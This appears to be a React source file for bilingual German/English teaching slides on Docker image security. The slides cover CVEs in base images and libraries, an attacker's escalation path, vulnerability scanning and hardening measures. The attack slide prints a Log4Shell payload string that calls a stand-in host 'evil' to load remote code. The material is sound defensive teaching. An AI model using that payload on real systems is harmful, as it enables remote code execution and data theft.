import { Svg, Take, Box as B, Arrow, Zone, Label } from '../../components/Svg.tsx'
import { Code } from '../../components/Code.tsx'
import { e } from '../../components/quizModel.ts'
import { Box, Tag, Mark, In, Txt, Person } from '../../components/harbor/harbor.tsx'

// Isolation und Sicherheit, strand "Images absichern": what known vulnerabilities in an image mean, what an attacker
// can do with one, how scanners find them and how to keep the damage small. CVEs shown are real, numbers are examples.

/* ── 1 · what is in an image: mostly code you did not write ── */
const stack: [string, string, string, string?][] = [
  [e('euer Code', 'your code'), e('ein paar MB, von euch geschrieben', 'a few MB, written by you'), 'var(--svc-api)'],
  [e('Bibliotheken in app.jar', 'Libraries in app.jar'), e('rund 100 JARs: Spring, Jackson, log4j …', 'about 100 JARs: Spring, Jackson, log4j …'), '#8e6bd8', 'log4j-core 2.14.1'],
  ['Java 21 (JRE)', e('Laufzeit, von Eclipse Temurin', 'runtime, from Eclipse Temurin'), 'var(--c-kernel)'],
  [e('Basis: Ubuntu', 'Base: Ubuntu'), e('rund 100 Pakete: openssl, glibc, bash …', 'about 100 packages: openssl, glibc, bash …'), '#9aa6b8', 'openssl 3.0.2'],
]
export const InImage = () => (
  <div className="dg-col">
    <Svg w={1000} h={350} label={e('Das Image der api besteht zum größten Teil aus fremdem Code. Bekannte Lücken stecken in einer Bibliothek und in einem Basis-Paket.', 'The api image mostly consists of code written by others. Known vulnerabilities sit in a library and in a base package.')}>
      <Tag x={0} y={0} w={560} label={e('Image mensa-api:1.1, von oben nach unten', 'Image mensa-api:1.1, top to bottom')} tone="sky" />
      {stack.map(([name, sub, color, cve], k) => (
        <In key={name} i={k + 1}>
          <rect x={0} y={56 + k * 70} width={560} height={60} rx={10} fill={`color-mix(in srgb, ${color} 16%, #fff)`} stroke={color} strokeWidth={2} />
          <Txt x={20} y={82 + k * 70} size={15} w={700} fill="var(--ink)">{name}</Txt>
          <Txt x={20} y={102 + k * 70} size={12.5}>{sub}</Txt>
          {cve && <><rect x={360} y={70 + k * 70} width={186} height={32} rx={8} fill="#fdecea" stroke="var(--bad)" /><text x={453} y={91 + k * 70} fontSize={12.5} textAnchor="middle" fill="var(--bad)" style={{ fontFamily: 'var(--mono)' }}>{cve}</text></>}
        </In>
      ))}
      <Tag x={600} y={60} w={400} label={e('Jede Schicht kann bekannte Lücken mitbringen', 'Every layer can bring known vulnerabilities')} sub={e('veröffentlicht als CVE mit Nummer und Schweregrad', 'published as a CVE with a number and severity')} tone="bad" i={5} />
      <Tag x={600} y={150} w={400} label="CVE-2021-44228 · log4j" sub={e('„Log4Shell“: ein Text im Log startet fremden Code', '“Log4Shell”: a text in the log starts foreign code')} tone="sand" i={6} />
      <Tag x={600} y={232} w={400} label="CVE-2022-3602 · openssl" sub={e('Speicherfehler beim Prüfen von Zertifikaten', 'memory error when checking certificates')} tone="sand" i={6} />
    </Svg>
    <Take i={7} label={e('Merke', 'Remember')} text={e('In einem Image steckt viel mehr fremder Code als eigener. Eine Lücke in irgendeiner Schicht ist eine Lücke in eurer App, auch wenn euer eigener Code fehlerfrei ist.', 'An image holds far more code from others than your own. A vulnerability in any layer is a vulnerability in your app, even if your own code is flawless.')} />
  </div>
)

/* ── 2 · what can happen: one vulnerable library, five steps ── */
const harm: [number, string, string][] = [
  [1, e('fremder Code in api', 'foreign code in api'), e('über die Lücke in log4j', 'through the hole in log4j')],
  [2, e('liest DB_PASSWORD', 'reads DB_PASSWORD'), e('aus den Umgebungsvariablen', 'from the environment variables')],
  [3, e('kopiert die Datenbank', 'copies the database'), e('db:5432 im selben Netz', 'db:5432 in the same network')],
  [4, e('startet einen Miner', 'starts a miner'), e('CPU 100 %, alles wird langsam', 'CPU 100 %, all gets slow')],
  [5, e('übernimmt den Host', 'takes over the host'), e('bei root + docker.sock', 'with root + docker.sock')],
]
export const Attack = () => (
  <div className="dg-col">
    <Svg w={1000} h={400} label={e('Ein Angreifer nutzt die Lücke in der api und kommt Schritt für Schritt weiter: Passwort, Datenbank, Rechenzeit, am Ende der ganze Rechner', 'An attacker uses the hole in the api and gets further step by step: password, database, CPU time, finally the whole machine')}>
      <Person x={30} y={150} role="grey" i={0} />
      <Label x={60} y={222} size={13} weight={700} tone="bad" i={0}>{e('Angreifer', 'Attacker')}</Label>
      <In i={0}><rect x={100} y={120} width={220} height={40} rx={8} fill="#fdecea" stroke="var(--bad)" /><text x={210} y={145} fontSize={12.5} textAnchor="middle" fill="var(--bad)" style={{ fontFamily: 'var(--mono)' }}>{'${jndi:ldap://evil/x}'}</text></In>
      <Label x={210} y={110} size={12.5} tone="muted" i={0}>{e('eine Anfrage an :8080', 'one request to :8080')}</Label>
      <Zone x={340} y={20} w={640} h={290} label={e('Server', 'Server')} sub="Docker" i={1} />
      <Box x={370} y={110} w={150} h={60} svc="api" i={1} />
      <Arrow d="M322 140 H366" kind="bad" n={1} nx={344} ny={168} i={1} />
      <Box x={600} y={60} w={150} h={56} svc="db" i={2} />
      <Arrow d="M522 128 L596 96" kind="bad" n={3} nx={560} ny={98} i={3} />
      <B x={600} y={150} w={150} h={50} t="bad" label="xmrig" sub={e('Miner', 'miner')} size={14} i={4} />
      <Arrow d="M522 150 L596 172" kind="bad" n={4} nx={560} ny={176} i={4} />
      <B x={790} y={230} w={170} h={56} t="hyper" label="docker.sock" sub={e('gemountet', 'mounted')} size={14} i={5} />
      <Arrow d="M500 172 V258 H786" kind="bad" n={5} nx={650} ny={258} i={5} />
      <B x={356} y={194} w={130} h={40} t="host" label="DB_PASSWORD" sub="env" size={12} mono i={2} />
      <Arrow d="M421 172 V190" kind="bad" n={2} nx={340} ny={214} i={2} />
      <Mark x={520} y={110} bad i={1} r={12} />
      {harm.map(([n, title, sub], k) => (
        <In key={n} i={n}>
          <rect x={k * 200} y={326} width={192} height={62} rx={10} fill="#fff" stroke="var(--bad)" strokeWidth={1.5} />
          <circle cx={k * 200 + 20} cy={346} r={11} fill="var(--bad)" /><text x={k * 200 + 20} y={351} fontSize={13} fontWeight={700} textAnchor="middle" fill="#fff">{n}</text>
          <Txt x={k * 200 + 38} y={351} size={12.5} w={700} fill="var(--ink)">{title}</Txt>
          <Txt x={k * 200 + 12} y={376} size={11.5}>{sub}</Txt>
        </In>
      ))}
    </Svg>
    <Take i={6} label={e('Merke', 'Remember')} text={e('Die Lücke öffnet die Tür. Wie weit ein Angreifer kommt, entscheiden eure Einstellungen: läuft die App als root, stehen Passwörter in Variablen, ist die db für alle erreichbar, ist docker.sock gemountet?', 'The vulnerability opens the door. How far an attacker gets is decided by your settings: does the app run as root, are passwords in variables, can everyone reach the db, is docker.sock mounted?')} />
  </div>
)

/* ── 3 · finding vulnerabilities: a scanner compares package versions with known CVEs ── */
export const Scan = () => (
  <div className="dg-col">
  <div className="dg-split">
    <Code title="Terminal" lines={[
      { t: 'docker scout cves mensa-api:1.1', k: 'cmd' },
      { t: e('# Beispielausgabe, gekürzt', '# example output, shortened'), k: 'note' },
      { t: 'CRITICAL  CVE-2021-44228  log4j-core 2.14.1', k: 'bad' },
      { t: '          fixed in 2.17.1', k: 'out' },
      { t: 'HIGH      CVE-2022-3602   openssl 3.0.2', k: 'bad' },
      { t: '          fixed in 3.0.7', k: 'out' },
      { t: e('# dasselbe mit Trivy:', '# the same with Trivy:'), k: 'note' },
      { t: 'trivy image --severity HIGH,CRITICAL \\', k: 'cmd' },
      { t: '  mensa-api:1.1', k: 'cont' },
    ]} />
    <Svg w={500} h={400} label={e('Der Scanner liest die Paketliste des Images und vergleicht sie mit einer Datenbank bekannter Lücken', 'The scanner reads the image package list and compares it with a database of known vulnerabilities')}>
      <B x={0} y={0} w={220} h={64} t="libs" label="mensa-api:1.1" sub="Image" size={15} mono />
      <Arrow i={1} d="M110 66 V104" label={e('auslesen', 'read out')} lx={122} ly={90} anchor="start" />
      <B i={1} x={0} y={108} w={220} h={110} t="app" label={e('Paketliste (SBOM)', 'Package list (SBOM)')} sub={e('Name + Version jedes Pakets', 'name + version of each package')} size={15} />
      <B i={2} x={280} y={108} w={220} h={110} t="reg" label={e('CVE-Datenbank', 'CVE database')} sub={e('bekannte Lücken je Version', 'known holes per version')} size={15} />
      <Arrow i={2} d="M276 163 H224" both />
      <Label i={2} x={250} y={136} size={12.5} tone="muted">{e('vergleichen', 'compare')}</Label>
      <Arrow i={3} d="M250 220 V258" />
      <B i={3} x={60} y={262} w={380} h={64} t="bad" label={e('Bericht nach Schweregrad', 'Report by severity')} sub={e('CRITICAL · HIGH · MEDIUM · LOW, mit „fixed in“', 'CRITICAL · HIGH · MEDIUM · LOW, with “fixed in”')} size={15} />
      <Label i={4} x={250} y={360} size={13} tone="bad">{e('Findet nur bekannte Lücken,', 'Finds known holes only,')}</Label>
      <Label i={4} x={250} y={380} size={13} tone="bad">{e('und nur in Paketen, die er erkennt.', 'and only in packages it recognises.')}</Label>
    </Svg>
  </div>
    <Take i={5} label={e('Merke', 'Remember')} text={e('Ein Scanner rät nicht, er vergleicht Versionen. Die Spalte „fixed in“ sagt, auf welche Version ihr aktualisieren müsst: im Basis-Image oder in der pom.xml.', 'A scanner does not guess, it compares versions. The column “fixed in” tells you which version to update to: in the base image or in pom.xml.')} />
  </div>
)

/* ── 4 · keeping the attack surface small: each measure stops a step from slide 2 ── */
const bases: [string, string, number][] = [
  ['eclipse-temurin:21-jdk', e('Compiler, Shell, Paketmanager', 'compiler, shell, package manager'), 1],
  ['eclipse-temurin:21-jre', e('nur Laufzeit, noch mit Shell', 'runtime only, still with a shell'), .62],
  ['distroless/java21', e('ohne Shell, ohne Paketmanager', 'no shell, no package manager'), .2],
]
const measures: [string, string, string][] = [
  ['1', e('schlankes Basis-Image, Multi-Stage', 'lean base image, multi-stage'), e('weniger Pakete, weniger Lücken', 'fewer packages, fewer holes')],
  ['2', e('Passwort als Secret-Datei', 'password as a secret file'), e('nicht in env, inspect, Logs', 'not in env, inspect, logs')],
  ['3', e('db nur im Netz backend', 'db only in the network backend'), e('frontend und Fremde kommen nicht hin', 'frontend and strangers cannot reach it')],
  ['4', e('Limits: cpus, mem_limit', 'limits: cpus, mem_limit'), e('ein Miner bremst nur sich selbst', 'a miner only slows itself')],
  ['5', e('USER statt root, kein docker.sock', 'USER instead of root, no docker.sock'), e('auch read_only und cap_drop: ALL', 'also read_only and cap_drop: ALL')],
]
export const Harden = () => (
  <div className="dg-col">
    <Svg w={1000} h={380} label={e('Links drei Basis-Images von groß bis schlank, rechts fünf Maßnahmen, jede gegen einen Schritt des Angriffs', 'Left three base images from big to lean, right five measures, each against one step of the attack')}>
      <Tag x={0} y={0} w={420} label={e('Weniger im Image = weniger Lücken', 'Less in the image = fewer holes')} sub={e('Balken: Menge an Paketen, Beispielwerte', 'bar: amount of packages, example values')} tone="sky" />
      {bases.map(([name, sub, w], k) => (
        <In key={name} i={k + 1}>
          <text x={0} y={84 + k * 92} fontSize={14} fontWeight={700} fill="var(--ink)" style={{ fontFamily: 'var(--mono)' }}>{name}</text>
          <rect x={0} y={94 + k * 92} width={420 * w} height={22} rx={6} fill={k === 2 ? 'var(--ok)' : 'var(--blue)'} opacity={.7} />
          <Txt x={0} y={136 + k * 92} size={12.5}>{sub}</Txt>
        </In>
      ))}
      <Tag x={470} y={0} w={530} label={e('Jede Maßnahme stoppt einen Schritt des Angriffs', 'Each measure stops one step of the attack')} tone="ok" i={4} />
      {measures.map(([n, title, sub], k) => (
        <In key={n} i={4 + k * .5}>
          <rect x={470} y={56 + k * 64} width={530} height={56} rx={10} fill="#e2f5ec" stroke="var(--ok)" strokeWidth={1.5} />
          <circle cx={494} cy={84 + k * 64} r={12} fill="var(--ok)" /><text x={494} y={89 + k * 64} fontSize={13} fontWeight={700} textAnchor="middle" fill="#fff">{n}</text>
          <Txt x={518} y={80 + k * 64} size={14} w={700} fill="var(--ink)">{title}</Txt>
          <Txt x={518} y={99 + k * 64} size={12.5}>{sub}</Txt>
        </In>
      ))}
    </Svg>
    <Take i={7} label={e('Merke', 'Remember')} text={e('Lücken ganz vermeiden geht nicht. Ihr sorgt dafür, dass wenig im Image steckt und dass eine Lücke wenig anrichten kann: kein root, keine offenen Passwörter, getrennte Netze, Limits.', 'You cannot avoid vulnerabilities completely. You make sure little is in the image and that a hole can do little harm: no root, no open passwords, separate networks, limits.')} />
  </div>
)

/* ── 5 · staying on top: scan on every build, rebuild when new CVEs appear ── */
const steps: [string, string, 'host' | 'libs' | 'app' | 'bad' | 'ok'][] = [
  ['git push', e('Code geändert', 'code changed'), 'host'],
  ['build', e('Image bauen', 'build image'), 'libs'],
  ['scan', e('Lücken suchen', 'look for holes'), 'app'],
  [e('Prüfung', 'Gate'), e('CRITICAL? dann Stopp', 'CRITICAL? then stop'), 'bad'],
  ['push', e('in die Registry', 'to the registry'), 'ok'],
]
export const Rebuild = () => (
  <div className="dg-col">
    <Svg w={1000} h={350} label={e('Oben die CI-Pipeline mit Scan und Prüfung vor dem push, unten ein Image, das ohne Änderung altert und neu gebaut wird', 'Top: the CI pipeline with scan and gate before push, bottom: an image that ages without changes and is rebuilt')}>
      <Label x={0} y={18} anchor="start" size={15} weight={700}>{e('Bei jedem Build: scannen, bevor es in die Registry geht', 'On every build: scan before it goes to the registry')}</Label>
      {steps.map(([title, sub, t], k) => (
        <g key={title}>
          <B i={k} x={k * 204} y={36} w={180} h={66} t={t} label={title} sub={sub} size={15} />
          {k < 4 && <Arrow i={k + 1} d={`M${k * 204 + 182} 69 H${k * 204 + 200}`} />}
        </g>
      ))}
      <Arrow i={4} d="M702 104 V140" kind="bad" />
      <Label i={4} x={702} y={160} size={13} tone="bad">{e('Build schlägt fehl, nichts wird ausgeliefert', 'build fails, nothing is shipped')}</Label>
      <Label i={5} x={0} y={210} anchor="start" size={15} weight={700}>{e('Ohne Änderung: das Image altert trotzdem', 'Without changes: the image ages anyway')}</Label>
      <B i={5} x={0} y={228} w={280} h={70} t="ok" label={e('heute gebaut', 'built today')} sub={e('Scan: keine bekannte Lücke', 'scan: no known hole')} size={15} />
      <Arrow i={6} d="M282 263 H350" />
      <B i={6} x={354} y={228} w={300} h={70} t="bad" label={e('drei Monate später', 'three months later')} sub={e('neue CVEs bekannt, Image unverändert', 'new CVEs known, image unchanged')} size={15} />
      <Arrow i={7} d="M656 263 H724" />
      <B i={7} x={728} y={228} w={272} h={70} t="engine" label={e('↻ neu bauen', '↻ rebuild')} sub={e('aktuelle Basis, neue Versionen', 'current base, new versions')} size={15} />
      <Label i={7} x={1000} y={326} anchor="end" size={12.5} tone="muted">{e('Renovate oder Dependabot melden neue Versionen', 'Renovate or Dependabot report new versions')}</Label>
    </Svg>
    <Take i={8} label={e('Merke', 'Remember')} text={e('Ein Image wird nicht sicherer, wenn man es liegen lässt: Jeden Tag werden neue Lücken bekannt. Deshalb bei jedem Build scannen und regelmäßig mit aktuellem Basis-Image neu bauen.', 'An image does not get safer by leaving it alone: new vulnerabilities become known every day. So scan on every build and rebuild regularly with a current base image.')} />
  </div>
)
